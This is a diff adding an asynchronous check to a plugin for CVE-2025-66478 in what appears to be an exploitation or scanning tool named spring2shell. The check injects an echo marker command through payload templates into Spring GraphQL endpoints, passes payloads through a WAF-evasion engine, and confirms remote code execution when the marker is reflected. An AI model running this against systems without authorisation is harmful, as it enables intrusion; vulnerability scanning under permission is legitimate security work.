@@ -68,6 +68,60 @@ class CVE_2025_66478_Plugin(BasePlugin):
                     continue
         return None
 
+    async def async_check(
+        self,
+        session: Any,
+        target: str,
+        endpoint: str,
+        headers: dict[str, str],
+    ) -> dict[str, Any] | None:
+        import aiohttp
+        if not isinstance(session, aiohttp.ClientSession):
+            return await super().async_check(session, target, endpoint, headers)
+
+        import random
+        from spring2shell.utils.async_network import send_async_request
+        from spring2shell.utils.auth import audit_log
+
+        marker = f"RCE_{random.randint(100000, 999999)}"
+        test_cmd = f"echo {marker}"
+        content_types = ["application/json", "application/graphql+json"]
+
+        for payload_template in self.payload_templates:
+            payload = payload_template.replace("COMMAND", test_cmd)
+            for ct in content_types:
+                req_headers = headers.copy()
+                req_headers["Content-Type"] = ct
+                payload, req_headers = waf_engine.apply(payload, req_headers)
+
+                try:
+                    resp = await send_async_request(
+                        session, "POST", endpoint, data=payload, headers=req_headers, timeout=5
+                    )
+                    async with resp:
+                        text = await resp.text()
+                        status = resp.status
+                        audit_log("POST", endpoint, status, payload[:100], "cve_scan")
+
+                        if status in (200, 400, 500) and marker in text:
+                            return build_finding(
+                                url=target,
+                                endpoint=endpoint,
+                                status="confirmed",
+                                cve=self.cve_id,
+                                confidence="high",
+                                reason="CVE_2025_66478_CONFIRMED",
+                                evidence=f"Reflected command execution marker '{marker}' in response.",
+                                payload=payload,
+                                method="POST",
+                                status_code=status,
+                                framework="Spring GraphQL",
+                            )
+                except Exception:
+                    continue
+        return None
+
+
     def exploit(
         self,
         session: requests.Session,
